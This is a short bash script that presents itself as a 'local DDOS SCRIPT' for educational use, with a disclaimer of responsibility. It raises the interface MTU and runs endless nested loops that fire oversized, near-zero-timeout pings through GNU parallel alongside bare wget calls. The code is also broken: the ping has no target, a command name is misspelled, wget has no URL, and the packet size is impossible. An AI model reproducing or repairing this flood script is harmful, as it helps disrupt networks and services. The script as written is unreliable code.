#!/usr/local/bin/parallel --shebang --pipe #!/bin/bash
#please execuse my spelling I"m a engieer not a english major  
#local DDOS SCRIPT THIS IS USED FOR EDUCATINAL USE ONLY I AM NOT RESPOSABLE FOR YOUR SCREW UP 
# thsi was made on OSX you may need to charge some vars depending on your OS
export nD=$(ifconfig | grep -o en0) #nD is network device; this could be eth0 or wlan0 on debain based OS and en0 on OSX for wireless
ifconfig $nD mtu 9000 
while true
do
#this may look reducent but when you use GNU parallel you can spawn many of the same processes 
while true 
do 
ping -c 1500 -s 99999999 -W 0.0001 | paralell -j32  &
wget 
done
done
